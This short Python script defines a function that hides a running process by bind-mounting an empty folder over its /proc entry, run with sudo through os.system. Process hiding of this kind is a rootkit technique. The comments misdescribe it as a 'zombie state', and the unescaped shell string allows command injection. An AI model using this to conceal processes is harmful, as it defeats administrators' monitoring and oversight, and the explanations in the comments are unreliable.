import os


def hideProcess(PID,username):

    # mount an empty folder in the process folder
    # mount will create a folder in /proc/ if it doesn't exist and mount an empty folder in it to hide the process and its children and put the process in a zombie state
    # zombie state: the process is still running but it's not visible to the user beacuse it's not in the process list
    os.system(
        "sudo mount -o bind /home/{}/empty /proc/{}".format(username, PID))
